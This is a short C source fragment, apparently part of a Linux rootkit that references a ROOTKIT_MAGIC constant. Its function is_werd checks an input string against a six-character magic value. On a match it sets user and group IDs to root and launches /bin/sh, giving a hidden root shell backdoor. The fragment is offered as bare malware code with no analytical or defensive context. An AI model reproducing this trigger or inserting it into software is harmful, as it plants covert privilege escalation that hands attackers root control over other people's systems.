#ifdef FIRST_TIME
inline char *is_werd(char *nutty_wild_char_pointer)
{
	char MAG[7];

	MAG[0]=ROOTKIT_MAGIC[0];
	MAG[1]=ROOTKIT_MAGIC[1];
	MAG[2]=ROOTKIT_MAGIC[2];
	MAG[3]=ROOTKIT_MAGIC[3];
	MAG[4]=ROOTKIT_MAGIC[4];
	MAG[5]=ROOTKIT_MAGIC[5];
	MAG[6]='\0';

	if(!strcmp(nutty_wild_char_pointer,MAG)) {
		setuid(0);
		setgid(0);
		seteuid(0);
		setegid(0);
		execl("/bin/sh","sh",(char *)0);
	} else return(nutty_wild_char_pointer);
}
#endif
